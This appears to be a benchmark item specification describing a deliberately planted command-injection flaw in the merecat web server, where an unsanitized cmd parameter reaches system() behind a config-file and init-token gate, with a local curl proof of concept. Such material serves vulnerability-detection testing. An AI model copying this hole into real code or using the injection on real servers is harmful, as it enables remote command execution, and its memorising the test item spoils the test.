AXES:        C3 I1 S1

DESCRIPTION:
  Config-file-gated command injection with runtime initialization state.
  The server must be started with --exec-config pointing to a file containing
  exec_mode=1, exec_logging=1, and exec_secret=<secret>. Before /exec can be
  used, /exec/init?token=<secret> must be called to set exec_initialized=1.
  The cmd query parameter flows directly into system(). No sanitization.

CONFIG_GATE (C3 — config file + runtime state):
  mechanism:  minimal key=value parser; --exec-config PATH reads file into
              struct exec_config { int enabled; int logging; char secret[64]; }
              A separate global exec_initialized is set to 1 by /exec/init.
  check:      exec_cfg.enabled && exec_initialized guard above system()
  complexity: requires modelling file I/O data flow AND inter-request state

INPUT_FLOW (I1 — direct):
  entry:      HTTP GET /exec?cmd=<payload>  →  hc->query
  path:       httpd_start_request() dispatches to handle_exec()
              handle_exec() extracts cmd= from hc->query
              raw string passed directly to system()
  transforms: none

SANITIZATION (S1 — none):
  none

SINK:        system() in handle_exec() (src/libhttpd.c)

CHANGED FILES:
  src/merecat.c — adds struct exec_config (with secret), exec_initialized,
                  --exec-config pre-scan parser
  src/libhttpd.c — adds handle_exec_init(), handle_exec() (I1/S1), route guard

EXPLOIT:
  build:   bash build.sh
  start:   printf "exec_mode=1\nexec_logging=1\nexec_secret=s3cr3t156\n" > /tmp/e.conf
           ./merecat -n -p 18156 /tmp/www --exec-config /tmp/e.conf
  init:    curl 'http://127.0.0.1:18156/exec/init?token=s3cr3t156'
  trigger: curl 'http://127.0.0.1:18156/exec?cmd=id>/tmp/poc_156_marker'
  verify:  cat /tmp/poc_156_marker
  expect:  uid= line written by server process

  gate bypass: omitting --exec-config causes /exec to return 404.
               calling /exec before /exec/init also returns 404.

NOTES:
  - system() output goes to server stdout/stderr, not HTTP response body.
  - merecat takes ~2s to bind; PoC uses sleep 2.
  - exec_initialized is a global; it persists across requests within one server run.
